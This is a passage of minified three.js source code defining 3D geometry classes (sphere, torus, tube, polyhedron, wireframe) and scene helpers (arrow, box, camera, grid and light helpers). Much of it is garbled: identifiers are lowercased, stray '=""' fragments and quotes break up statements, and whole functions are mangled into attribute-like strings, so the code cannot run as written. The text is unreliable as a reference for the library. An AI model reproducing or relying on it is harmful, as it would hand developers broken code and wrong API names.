three.vector2,u;for(a=\"0;a<=d;a++){for(u=0;u<=c;u++)m=e+u/c*f,s.x=q*Math.cos(m),s.y=q*Math.sin(m),k.setXYZ(n,s.x,s.y,s.z),l.setXYZ(n,0,0,1),t.x=(s.x/b+1)/2,t.y=(s.y/b+1)/2,g.setXY(n,t.x,t.y),n++;q+=r}for(a=0;a<d;a++)for(b=a*(c+1),u=0;u<c;u++)e=m=u+b,f=m+c+1,n=m+c+2,m+=1,h.setX(p,e),p++,h.setX(p,f),p++,h.setX(p,n),p++,h.setX(p,e),p++,h.setX(p,n),p++,h.setX(p,m),p++;this.setIndex(h);this.addAttribute(\" position\",\"=\"\" k);this.addattribute(\"normal\",l);this.addattribute(\"uv\",g)};three.ringbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.RingBufferGeometry.prototype.constructor=THREE.RingBufferGeometry;THREE.RingGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\" ringgeometry\";this.parameters=\"{innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};this.fromBufferGeometry(new\"\" three.ringbuffergeometry(a,b,c,d,e,f))};=\"\" three.ringgeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.RingGeometry.prototype.constructor=THREE.RingGeometry;THREE.SphereGeometry=function(a,b,c,d,e,f,g){THREE.Geometry.call(this);this.type=\" spheregeometry\";this.parameters=\"{radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};this.fromBufferGeometry(new\"\" three.spherebuffergeometry(a,b,c,d,e,f,g))};three.spheregeometry.prototype=\"Object.create(THREE.Geometry.prototype);\" three.spheregeometry.prototype.constructor=\"THREE.SphereGeometry;\" three.spherebuffergeometry=\"function(a,b,c,d,e,f,g){THREE.BufferGeometry.call(this);this.type=\" spherebuffergeometry\";this.parameters=\"{radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};a=a||50;b=Math.max(3,Math.floor(b)||8);c=Math.max(2,Math.floor(c)||6);d=void\"\" h=\"f+g,k=(b+1)*(c+1),l=new\" float32array(3*k),3),n=\"new\" k),3),k=\"new\" float32array(2*k),2),p=\"0,m=[],q=new\" three.vector3,r=\"0;r<=c;r++){for(var\" s=\"[],t=r/c,u=0;u<=b;u++){var\" v=\"u/b,C=-a*Math.cos(d+v*e)*Math.sin(f+t*g),w=a*Math.cos(f+t*g),E=a*Math.sin(d+v*e)*Math.sin(f+t*g);q.set(C,w,E).normalize();l.setXYZ(p,C,w,E);n.setXYZ(p,q.x,q.y,q.z);k.setXY(p,v,1-t);s.push(p);p++}m.push(s)}d=[];for(r=0;r<c;r++)for(u=0;u<b;u++)e=m[r][u+1],g=m[r][u],p=m[r+1][u],q=m[r+1][u+1],(0!==r||0<f)&&d.push(e,g,q),(r!==c-1||h<Math.PI)&&d.push(g,p,q);this.setIndex(new\" (65535<=\"\" l.count?three.uint32attribute:three.uint16attribute)(d,1));this.addattribute(\"position\",l);this.addattribute(\"normal\",n);this.addattribute(\"uv\",k);this.boundingsphere=\"new\" three.sphere(new=\"\" three.vector3,a)};three.spherebuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.SphereBufferGeometry.prototype.constructor=THREE.SphereBufferGeometry;\" three.textgeometry=\"function(a,b){b=b||{};var\" instanceof=\"\" three.font)return=\"\" console.error(\"three.textgeometry:=\"\" font=\"\" parameter=\"\" is=\"\" not=\"\" an=\"\" instance=\"\" of=\"\" three.font.\"),new=\"\" three.geometry;c=\"c.generateShapes(a,b.size,b.curveSegments);b.amount=void\" three.textgeometry.prototype=\"Object.create(THREE.ExtrudeGeometry.prototype);THREE.TextGeometry.prototype.constructor=THREE.TextGeometry;\" three.torusbuffergeometry=\"function(a,b,c,d,e){THREE.BufferGeometry.call(this);this.type=\" torusbuffergeometry\";this.parameters=\"{radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};a=a||100;b=b||40;c=Math.floor(c)||8;d=Math.floor(d)||6;e=e||2*Math.PI;var\"\" (65535<g?uint32array:uint16array)(g),h=\"new\" float32array(3*f),k=\"new\" float32array(3*f),f=\"new\" float32array(2*f),l=\"0,n=0,p=0,m=new\" three.vector3,s,t;for(s=\"0;s<=c;s++)for(t=0;t<=d;t++){var\" u=\"t/d*e,v=s/c*Math.PI*2;q.x=(a+b*Math.cos(v))*Math.cos(u);q.y=(a+b*Math.cos(v))*Math.sin(u);q.z=b*Math.sin(v);h[l]=q.x;h[l+1]=q.y;h[l+2]=q.z;m.x=a*Math.cos(u);m.y=a*Math.sin(u);r.subVectors(q,m).normalize();k[l]=r.x;k[l+1]=r.y;k[l+2]=r.z;f[n]=t/d;f[n+1]=s/c;l+=3;n+=2}for(s=1;s<=c;s++)for(t=1;t<=d;t++)a=(d+1)*(s-1)+t-1,b=(d+1)*(s-1)+t,e=(d+1)*s+t,g[p]=(d+1)*s+t-1,g[p+1]=a,g[p+2]=e,g[p+3]=a,g[p+4]=b,g[p+5]=e,p+=6;this.setIndex(new\" three.bufferattribute(g,1));this.addattribute(\"position\",new=\"\" three.bufferattribute(h,=\"\" 3));this.addattribute(\"normal\",new=\"\" three.bufferattribute(k,3));this.addattribute(\"uv\",new=\"\" three.bufferattribute(f,2))};three.torusbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.TorusBufferGeometry.prototype.constructor=THREE.TorusBufferGeometry;\" three.torusgeometry=\"function(a,b,c,d,e){THREE.Geometry.call(this);this.type=\" torusgeometry\";this.parameters=\"{radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};this.fromBufferGeometry(new\"\" three.torusbuffergeometry(a,b,c,d,e))};three.torusgeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.TorusGeometry.prototype.constructor=THREE.TorusGeometry;\" three.torusknotbuffergeometry=\"function(a,b,c,d,e,f){function\" g(a,b,c,d,e){var=\"\" (65535<k?uint32array:uint16array)(k),1),l=\"new\" h),3),n=\"new\" float32array(3*h),3),h=\"new\" float32array(2*h),2),p,m,q=\"0,r=0,s=new\" three.vector3,u=\"new\" three.vector2,v=\"new\" three.vector3,w=\"new\" three.vector3,e=\"new\" three.vector3,z=\"new\" three.vector3;for(p=\"0;p<=c;++p)for(m=p/c*e*Math.PI*2,g(m,e,f,a,v),g(m+.01,e,f,a,C),E.subVectors(C,v),z.addVectors(C,v),w.crossVectors(E,z),z.crossVectors(w,E),w.normalize(),z.normalize(),m=0;m<=d;++m){var\" y=\"m/d*Math.PI*2,A=-b*Math.cos(y),\" three.torusknotbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.TorusKnotBufferGeometry.prototype.constructor=THREE.TorusKnotBufferGeometry;\" three.torusknotgeometry=\"function(a,b,c,d,e,f,g){THREE.Geometry.call(this);this.type=\" torusknotgeometry\";this.parameters=\"{radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};void\"\" heightscale=\"\" has=\"\" been=\"\" deprecated.=\"\" use=\"\" .scale(=\"\" x,=\"\" y,=\"\" z=\"\" )=\"\" instead.\");this.frombuffergeometry(new=\"\" three.torusknotbuffergeometry(a,b,c,d,e,f));this.mergevertices()};three.torusknotgeometry.prototype=\"Object.create(THREE.Geometry.prototype);\" three.torusknotgeometry.prototype.constructor=\"THREE.TorusKnotGeometry;\" three.tubegeometry=\"function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\" tubegeometry\";this.parameters=\"{path:a,segments:b,radius:c,radialSegments:d,closed:e,taper:f};b=b||64;c=c||1;d=d||8;e=e||!1;f=f||THREE.TubeGeometry.NoTaper;var\"\" three.vector3,t,u,v;t=\"new\" three.tubegeometry.frenetframes(a,b,e);u=\"t.normals;v=t.binormals;this.tangents=t.tangents;this.normals=u;this.binormals=v;for(t=0;t<l;t++)for(g[t]=[],n=t/(l-1),r=a.getPointAt(n),h=u[t],k=v[t],m=c*f(n),n=0;n<\" d;n++)p=\"n/d*2*Math.PI,q=-m*Math.cos(p),p=m*Math.sin(p),s.copy(r),s.x+=q*h.x+p*k.x,s.y+=q*h.y+p*k.y,s.z+=q*h.z+p*k.z,g[t][n]=this.vertices.push(new\" three.vector3(s.x,s.y,s.z))-1;for(t=\"0;t<b;t++)for(n=0;n<d;n++)f=e?(t+1)%b:t+1,l=(n+1)%d,a=g[t][n],c=g[f][n],f=g[f][l],l=g[t][l],s=new\" three.vector2(t=\"\" b,n=\"\" d),u=\"new\" three.vector2((t+1)=\"\" d),v=\"new\" b,(n+1)=\"\" d),h=\"new\" d),this.faces.push(new=\"\" three.face3(a,c,l)),this.facevertexuvs[0].push([s,u,h]),this.faces.push(new=\"\" three.face3(c,=\"\" f,l)),this.facevertexuvs[0].push([u.clone(),v,h.clone()]);this.computefacenormals();this.computevertexnormals()};three.tubegeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.TubeGeometry.prototype.constructor=THREE.TubeGeometry;THREE.TubeGeometry.NoTaper=function(a){return\" 1};three.tubegeometry.sinusoidaltaper=\"function(a){return\" math.sin(math.pi*a)};=\"\" three.tubegeometry.frenetframes=\"function(a,b,c){var\" d=\"new\" three.matrix4;b+=\"1;var\" l,n,p;this.tangents=\"e;this.normals=f;this.binormals=g;for(l=0;l<b;l++)n=l/(b-1),e[l]=a.getTangentAt(n),e[l].normalize();f[0]=new\" three.vector3;g[0]=\"new\" three.vector3;a=\"Number.MAX_VALUE;l=Math.abs(e[0].x);n=Math.abs(e[0].y);p=Math.abs(e[0].z);l<=a&&(a=l,d.set(1,0,0));n<=a&&(a=n,d.set(0,1,0));p<=a&&d.set(0,0,1);h.crossVectors(e[0],d).normalize();f[0].crossVectors(e[0],\" h);g[0].crossvectors(e[0],f[0]);for(l=\"1;l<b;l++)f[l]=f[l-1].clone(),g[l]=g[l-1].clone(),h.crossVectors(e[l-1],e[l]),h.length()\">Number.EPSILON&&(h.normalize(),d=Math.acos(THREE.Math.clamp(e[l-1].dot(e[l]),-1,1)),f[l].applyMatrix4(k.makeRotationAxis(h,d))),g[l].crossVectors(e[l],f[l]);if(c)for(d=Math.acos(THREE.Math.clamp(f[0].dot(f[b-1]),-1,1)),d/=b-1,0<e[0].dot(h.crossvectors(f[0],f[b-1]))&&(d=-d),l=1;l<b;l++)f[l].applymatrix4(k.makerotationaxis(e[l],d*l)),g[l].crossvectors(e[l],f[l])}; three.polyhedrongeometry=\"function(a,b,c,d){function\" e(a){var=\"\" b=\"a.normalize().clone();b.index=k.vertices.push(b)-1;var\" c=\"Math.atan2(a.z,-a.x)/2/Math.PI+.5;a=Math.atan2(-a.y,Math.sqrt(a.x*a.x+a.z*a.z))/Math.PI+.5;b.uv=new\" three.vector2(c,1-a);return=\"\" b}function=\"\" f(a,b,c){var=\"\" d=\"new\" three.face3(a.index,b.index,c.index,[a.clone(),b.clone(),c.clone()]);k.faces.push(d);t.copy(a).add(b).add(c).dividescalar(3);d=\"Math.atan2(t.z,-t.x);k.faceVertexUvs[0].push([h(a.uv,a,d),h(b.uv,b,d),h(c.uv,c,d)])}function\" g(a,=\"\" b){for(var=\"\" n=\"e(d.clone().lerp(h,m/c)),p=e(g.clone().lerp(h,m/c)),q=c-m,r=0;r<=q;r++)l[m][r]=0===r&&m===c?n:e(n.clone().lerp(p,r/q))}for(m=0;m<c;m++)for(r=0;r<2*(c-m)-1;r++)d=Math.floor(r/2),0===r%2?f(l[m][d+1],l[m+1][d],l[m][d]):f(l[m][d+1],l[m+1][d+1],l[m+1][d])}function\" h(a,b,c){0=\"\">c&&1===a.x&&(a=new THREE.Vector2(a.x-1,a.y));0===b.x&&0===b.z&&(a=new THREE.Vector2(c/2/Math.PI+.5,a.y));\nreturn a.clone()}THREE.Geometry.call(this);this.type=\"PolyhedronGeometry\";this.parameters={vertices:a,indices:b,radius:c,detail:d};c=c||1;d=d||0;for(var k=this,l=0,n=a.length;l<n;l+=3)e(new three.vector3(a[l],a[l+1],a[l+2]));a=\"this.vertices;for(var\" p=\"[],m=l=0,n=b.length;l<n;l+=3,m++){var\" q=\"a[b[l]],r=a[b[l+1]],s=a[b[l+2]];p[m]=new\" three.face3(q.index,r.index,s.index,[q.clone(),r.clone(),s.clone()])}for(var=\"\" t=\"new\" three.vector3,l=\"0,n=p.length;l<n;l++)g(p[l],d);l=0;for(n=this.faceVertexUvs[0].length;l<\" n;l++)b=\"this.faceVertexUvs[0][l],d=b[0].x,a=b[1].x,p=b[2].x,m=Math.max(d,a,p),q=Math.min(d,a,p),.9<m&&.1\">q&&(.2>d&&(b[0].x+=1),.2>a&&(b[1].x+=1),.2>p&&(b[2].x+=1));l=0;for(n=this.vertices.length;l<n;l++)this.vertices[l].multiplyscalar(c);this.mergevertices();this.computefacenormals();this.boundingsphere=new three.sphere(new=\"\" three.vector3,c)};three.polyhedrongeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.PolyhedronGeometry.prototype.constructor=THREE.PolyhedronGeometry;\" three.dodecahedrongeometry=\"function(a,b){var\" c=\"(1+Math.sqrt(5))/2,d=1/c;THREE.PolyhedronGeometry.call(this,[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-d,-c,0,-d,c,0,d,-c,0,d,c,-d,-c,0,-d,c,0,d,-c,0,d,c,0,-c,0,-d,c,0,-d,-c,0,d,c,0,d],[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,\" 12,14,1,14,5,1,5,9],a,b);this.type=\"DodecahedronGeometry\" ;this.parameters=\"{radius:a,detail:b}};THREE.DodecahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.DodecahedronGeometry.prototype.constructor=THREE.DodecahedronGeometry;\" three.icosahedrongeometry=\"function(a,b){var\" three.icosahedrongeometry.prototype.constructor=\"THREE.IcosahedronGeometry;THREE.OctahedronGeometry=function(a,b){THREE.PolyhedronGeometry.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],a,b);this.type=\" octahedrongeometry\";this.parameters=\"{radius:a,detail:b}};THREE.OctahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.OctahedronGeometry.prototype.constructor=THREE.OctahedronGeometry;\"\" three.tetrahedrongeometry=\"function(a,b){THREE.PolyhedronGeometry.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],a,b);this.type=\" tetrahedrongeometry\";this.parameters=\"{radius:a,detail:b}};THREE.TetrahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.TetrahedronGeometry.prototype.constructor=THREE.TetrahedronGeometry;\"\" three.parametricgeometry=\"function(a,b,c){THREE.Geometry.call(this);this.type=\" parametricgeometry\";this.parameters=\"{func:a,slices:b,stacks:c};var\"\" d=\"this.vertices,e=this.faces,f=this.faceVertexUvs[0],g,h,k,l,n=b+1;for(g=0;g<=c;g++)for(l=g/c,h=0;h<=b;h++)k=h/b,k=a(k,l),d.push(k);var\" p,m,q,r;for(g=\"0;g<c;g++)for(h=0;h<b;h++)a=g*n+h,d=g*n+h+1,l=(g+1)*n+h+1,k=(g+1)*n+h,p=new\" three.vector2(h=\"\" b,g=\"\" c),m=\"new\" three.vector2((h+1)=\"\" c),q=\"new\" b,(g+1)=\"\" c),r=\"new\" c),e.push(new=\"\" three.face3(a,=\"\" d,k)),f.push([p,m,r]),e.push(new=\"\" three.face3(d,l,k)),f.push([m.clone(),q,r.clone()]);this.computefacenormals();this.computevertexnormals()};three.parametricgeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.ParametricGeometry.prototype.constructor=THREE.ParametricGeometry;\" three.wireframegeometry=\"function(a){function\" b(a,b){return=\"\" a-b}three.buffergeometry.call(this);var=\"\" instanceof=\"\" three.geometry){var=\"\" f=\"a.vertices,g=a.faces,h=0,k=new\" uint32array(6*g.length);a=\"0;for(var\" l=\"g.length;a<l;a++)for(var\" n=\"g[a],p=0;3\">p;p++){c[0]=n[e[p]];c[1]=n[e[(p+1)%3]];c.sort(b);var m=c.toString();void 0===d[m]&&(k[2*h]=c[0],k[2*h+1]=c[1],d[m]=!0,h++)}c=new Float32Array(6*h);a=0;for(l=h;a<l;a++)for(p=0;2>p;p++)d=f[k[2*a+p]],h=6*a+3*p,c[h+0]=d.x,c[h+1]=d.y,\nc[h+2]=d.z;this.addAttribute(\"position\",new THREE.BufferAttribute(c,3))}else if(a instanceof THREE.BufferGeometry){if(null!==a.index){l=a.index.array;f=a.attributes.position;e=a.groups;h=0;0===e.length&&a.addGroup(0,l.length);k=new Uint32Array(2*l.length);g=0;for(n=e.length;g<n;++g){a=e[g];p=a.start;m=a.count;a=p;for(var q=\"p+m;a<q;a+=3)for(p=0;3\">p;p++)c[0]=l[a+p],c[1]=l[a+(p+1)%3],c.sort(b),m=c.toString(),void 0===d[m]&&(k[2*h]=c[0],k[2*h+1]=c[1],d[m]=!0,h++)}c=new Float32Array(6*h);a=0;for(l=h;a<\nl;a++)for(p=0;2>p;p++)h=6*a+3*p,d=k[2*a+p],c[h+0]=f.getX(d),c[h+1]=f.getY(d),c[h+2]=f.getZ(d)}else for(f=a.attributes.position.array,h=f.length/3,k=h/3,c=new Float32Array(6*h),a=0,l=k;a<l;a++)for(p=0;3>p;p++)h=18*a+6*p,k=9*a+3*p,c[h+0]=f[k],c[h+1]=f[k+1],c[h+2]=f[k+2],d=9*a+(p+1)%3*3,c[h+3]=f[d],c[h+4]=f[d+1],c[h+5]=f[d+2];this.addAttribute(\"position\",new THREE.BufferAttribute(c,3))}};THREE.WireframeGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);\nTHREE.WireframeGeometry.prototype.constructor=THREE.WireframeGeometry;THREE.AxisHelper=function(a){a=a||1;var b=new Float32Array([0,0,0,a,0,0,0,0,0,0,a,0,0,0,0,0,0,a]),c=new Float32Array([1,0,0,1,.6,0,0,1,0,.6,1,0,0,0,1,0,.6,1]);a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.BufferAttribute(b,3));a.addAttribute(\"color\",new THREE.BufferAttribute(c,3));b=new THREE.LineBasicMaterial({vertexColors:THREE.VertexColors});THREE.LineSegments.call(this,a,b)};THREE.AxisHelper.prototype=Object.create(THREE.LineSegments.prototype);\nTHREE.AxisHelper.prototype.constructor=THREE.AxisHelper;\nTHREE.ArrowHelper=function(){var a=new THREE.BufferGeometry;a.addAttribute(\"position\",new THREE.Float32Attribute([0,0,0,0,1,0],3));var b=new THREE.CylinderBufferGeometry(0,.5,1,5,1);b.translate(0,-.5,0);return function(c,d,e,f,g,h){THREE.Object3D.call(this);void 0===f&&(f=16776960);void 0===e&&(e=1);void 0===g&&(g=.2*e);void 0===h&&(h=.2*g);this.position.copy(d);this.line=new THREE.Line(a,new THREE.LineBasicMaterial({color:f}));this.line.matrixAutoUpdate=!1;this.add(this.line);this.cone=new THREE.Mesh(b,\nnew THREE.MeshBasicMaterial({color:f}));this.cone.matrixAutoUpdate=!1;this.add(this.cone);this.setDirection(c);this.setLength(e,g,h)}}();THREE.ArrowHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.ArrowHelper.prototype.constructor=THREE.ArrowHelper;\nTHREE.ArrowHelper.prototype.setDirection=function(){var a=new THREE.Vector3,b;return function(c){.99999<c.y?this.quaternion.set(0,0,0,1):-.99999>c.y?this.quaternion.set(1,0,0,0):(a.set(c.z,0,-c.x).normalize(),b=Math.acos(c.y),this.quaternion.setFromAxisAngle(a,b))}}();THREE.ArrowHelper.prototype.setLength=function(a,b,c){void 0===b&&(b=.2*a);void 0===c&&(c=.2*b);this.line.scale.set(1,Math.max(0,a-b),1);this.line.updateMatrix();this.cone.scale.set(c,b,c);this.cone.position.y=a;this.cone.updateMatrix()};\nTHREE.ArrowHelper.prototype.setColor=function(a){this.line.material.color.copy(a);this.cone.material.color.copy(a)};THREE.BoxHelper=function(a,b){void 0===b&&(b=16776960);var c=new Uint16Array([0,1,1,2,2,3,3,0,4,5,5,6,6,7,7,4,0,4,1,5,2,6,3,7]),d=new Float32Array(24),e=new THREE.BufferGeometry;e.setIndex(new THREE.BufferAttribute(c,1));e.addAttribute(\"position\",new THREE.BufferAttribute(d,3));THREE.LineSegments.call(this,e,new THREE.LineBasicMaterial({color:b}));void 0!==a&&this.update(a)};\nTHREE.BoxHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.BoxHelper.prototype.constructor=THREE.BoxHelper;\nTHREE.BoxHelper.prototype.update=function(){var a=new THREE.Box3;return function(b){b instanceof THREE.Box3?a.copy(b):a.setFromObject(b);if(!a.isEmpty()){b=a.min;var c=a.max,d=this.geometry.attributes.position,e=d.array;e[0]=c.x;e[1]=c.y;e[2]=c.z;e[3]=b.x;e[4]=c.y;e[5]=c.z;e[6]=b.x;e[7]=b.y;e[8]=c.z;e[9]=c.x;e[10]=b.y;e[11]=c.z;e[12]=c.x;e[13]=c.y;e[14]=b.z;e[15]=b.x;e[16]=c.y;e[17]=b.z;e[18]=b.x;e[19]=b.y;e[20]=b.z;e[21]=c.x;e[22]=b.y;e[23]=b.z;d.needsUpdate=!0;this.geometry.computeBoundingSphere()}}}();\nTHREE.BoundingBoxHelper=function(a,b){var c=void 0!==b?b:8947848;this.object=a;this.box=new THREE.Box3;THREE.Mesh.call(this,new THREE.BoxGeometry(1,1,1),new THREE.MeshBasicMaterial({color:c,wireframe:!0}))};THREE.BoundingBoxHelper.prototype=Object.create(THREE.Mesh.prototype);THREE.BoundingBoxHelper.prototype.constructor=THREE.BoundingBoxHelper;THREE.BoundingBoxHelper.prototype.update=function(){this.box.setFromObject(this.object);this.box.size(this.scale);this.box.center(this.position)};\nTHREE.CameraHelper=function(a){function b(a,b,d){c(a,d);c(b,d)}function c(a,b){d.vertices.push(new THREE.Vector3);d.colors.push(new THREE.Color(b));void 0===f[a]&&(f[a]=[]);f[a].push(d.vertices.length-1)}var d=new THREE.Geometry,e=new THREE.LineBasicMaterial({color:16777215,vertexColors:THREE.FaceColors}),f={};b(\"n1\",\"n2\",16755200);b(\"n2\",\"n4\",16755200);b(\"n4\",\"n3\",16755200);b(\"n3\",\"n1\",16755200);b(\"f1\",\"f2\",16755200);b(\"f2\",\"f4\",16755200);b(\"f4\",\"f3\",16755200);b(\"f3\",\"f1\",16755200);b(\"n1\",\"f1\",16755200);\nb(\"n2\",\"f2\",16755200);b(\"n3\",\"f3\",16755200);b(\"n4\",\"f4\",16755200);b(\"p\",\"n1\",16711680);b(\"p\",\"n2\",16711680);b(\"p\",\"n3\",16711680);b(\"p\",\"n4\",16711680);b(\"u1\",\"u2\",43775);b(\"u2\",\"u3\",43775);b(\"u3\",\"u1\",43775);b(\"c\",\"t\",16777215);b(\"p\",\"c\",3355443);b(\"cn1\",\"cn2\",3355443);b(\"cn3\",\"cn4\",3355443);b(\"cf1\",\"cf2\",3355443);b(\"cf3\",\"cf4\",3355443);THREE.LineSegments.call(this,d,e);this.camera=a;this.camera.updateProjectionMatrix&&this.camera.updateProjectionMatrix();this.matrix=a.matrixWorld;this.matrixAutoUpdate=\n!1;this.pointMap=f;this.update()};THREE.CameraHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.CameraHelper.prototype.constructor=THREE.CameraHelper;\nTHREE.CameraHelper.prototype.update=function(){function a(a,g,h,k){d.set(g,h,k).unproject(e);a=c[a];if(void 0!==a)for(g=0,h=a.length;g<h;g++)b.vertices[a[g]].copy(d)}var 0=\"==b&&(b=1);var\" b,c,d=\"new\" three.vector3,e=\"new\" three.camera;return=\"\" function(){b=\"this.geometry;c=this.pointMap;e.projectionMatrix.copy(this.camera.projectionMatrix);a(\" c\",0,0,-1);a(\"t\",0,0,1);a(\"n1\",-1,-1,-1);a(\"n2\",1,-1,-1);a(\"n3\",-1,1,-1);a(\"n4\",1,1,-1);a(\"f1\",-1,-1,1);a(\"f2\",1,-1,1);a(\"f3\",-1,1,1);a(\"f4\",1,1,1);a(\"u1\",.7,1.1,-1);a(\"u2\",-.7,1.1,\"=\"\" -1);a(\"u3\",0,2,-1);a(\"cf1\",-1,0,1);a(\"cf2\",1,0,1);a(\"cf3\",0,-1,1);a(\"cf4\",0,1,1);a(\"cn1\",-1,0,-1);a(\"cn2\",1,0,-1);a(\"cn3\",0,-1,-1);a(\"cn4\",0,1,-1);b.verticesneedupdate=\"!0}}();\" three.directionallighthelper=\"function(a,b){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;void\" c=\"new\" three.buffergeometry;c.addattribute(\"position\",new=\"\" three.float32attribute([-b,b,0,b,b,0,b,-b,0,-b,-b,0,-b,b,0],3));var=\"\" d=\"new\" three.linebasicmaterial({fog:!1});this.add(new=\"\" three.line(c,d));c=\"new\" three.float32attribute([0,0,0,0,0,1],3));this.add(new=\"\" three.line(c,=\"\" d));this.update()};three.directionallighthelper.prototype=\"Object.create(THREE.Object3D.prototype);THREE.DirectionalLightHelper.prototype.constructor=THREE.DirectionalLightHelper;THREE.DirectionalLightHelper.prototype.dispose=function(){var\" a=\"this.children[0],b=this.children[1];a.geometry.dispose();a.material.dispose();b.geometry.dispose();b.material.dispose()};\" three.directionallighthelper.prototype.update=\"function(){var\" three.vector3,b=\"new\" three.vector3,c=\"new\" three.vector3;return=\"\" function(){a.setfrommatrixposition(this.light.matrixworld);b.setfrommatrixposition(this.light.target.matrixworld);c.subvectors(b,a);var=\"\" three.edgeshelper=\"function(a,b,c){b=void\" 0!=\"=b?b:16777215;THREE.LineSegments.call(this,new\" three.edgesgeometry(a.geometry,c),new=\"\" three.linebasicmaterial({color:b}));this.matrix=\"a.matrixWorld;this.matrixAutoUpdate=!1};THREE.EdgesHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.EdgesHelper.prototype.constructor=THREE.EdgesHelper;\" three.facenormalshelper=\"function(a,b,c,d){this.object=a;this.size=void\" instanceof=\"\" three.geometry?b=\"c.faces.length:console.warn(\" three.facenormalshelper:\"=\"\" only=\"\" three.geometry=\"\" is=\"\" supported.=\"\" use=\"\" three.vertexnormalshelper,=\"\" instead.\");c=\"new\" three.buffergeometry;b=\"new\" three.float32attribute(6*b,3);c.addattribute(\"position\",b);three.linesegments.call(this,c,new=\"\" three.linebasicmaterial({color:a,linewidth:d}));this.matrixautoupdate=\"!1;this.update()};THREE.FaceNormalsHelper.prototype=Object.create(THREE.LineSegments.prototype);THREE.FaceNormalsHelper.prototype.constructor=THREE.FaceNormalsHelper;\" three.facenormalshelper.prototype.update=\"function(){var\" three.matrix3;return=\"\" function(){this.object.updatematrixworld(!0);c.getnormalmatrix(this.object.matrixworld);for(var=\"\" n=\"f[k],p=n.normal;a.copy(g[n.a]).add(g[n.b]).add(g[n.c]).divideScalar(3).applyMatrix4(d);b.copy(p).applyMatrix3(c).normalize().multiplyScalar(this.size).add(a);\" e.setxyz(h,a.x,a.y,a.z);h+=\"1;e.setXYZ(h,b.x,b.y,b.z);h+=1}e.needsUpdate=!0;return\" this}}();=\"\" three.gridhelper=\"function(a,b,c,d){c=new\" three.color(void=\"\" e=\"[],f=[],g=-a,h=0;g<=a;g+=b){e.push(-a,0,g,a,0,g);e.push(g,0,-a,g,0,a);var\" k=\"0===g?c:d;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3;k.toArray(f,h);h+=3}a=new\" three.buffergeometry;a.addattribute(\"position\",new=\"\" three.float32attribute(e,3));a.addattribute(\"color\",new=\"\" three.float32attribute(f,3));e=\"new\" three.linebasicmaterial({vertexcolors:three.vertexcolors});three.linesegments.call(this,=\"\" a,e)};three.gridhelper.prototype=\"Object.create(THREE.LineSegments.prototype);THREE.GridHelper.prototype.constructor=THREE.GridHelper;THREE.GridHelper.prototype.setColors=function(){console.error(\" three.gridhelper:\"=\"\" setcolors()=\"\" has=\"\" been=\"\" deprecated,=\"\" pass=\"\" them=\"\" in=\"\" the=\"\" constructor=\"\" instead.\")};=\"\" three.hemispherelighthelper=\"function(a,b){THREE.Object3D.call(this);this.light=a;this.light.updateMatrixWorld();this.matrix=a.matrixWorld;this.matrixAutoUpdate=!1;this.colors=[new\" three.color,new=\"\" three.color];var=\"\" three.spheregeometry(b,4,2);c.rotatex(-math.pi=\"\" 2);for(var=\"\">d;d++)c.faces[d].color=this.colors[4>d?0:1];d=new THREE.MeshBasicMaterial({vertexColors:THREE.FaceColors,wireframe:!0});this.lightSphere=new THREE.Mesh(c,d);this.add(this.lightSphere);this.update()};\nTHREE.HemisphereLightHelper.prototype=Object.create(THREE.Object3D.prototype);THREE.HemisphereLightHelper.prototype.constructor=THREE.HemisphereLightHelper;THREE.HemisphereLightHelper.prototype.dispose=function(){this.lightSphere.geometry.dispose();this.lightSphere.material.dispose()};\nTHREE.HemisphereLightHelper.prototype.update=function(){var a=new THREE.Vector3;return 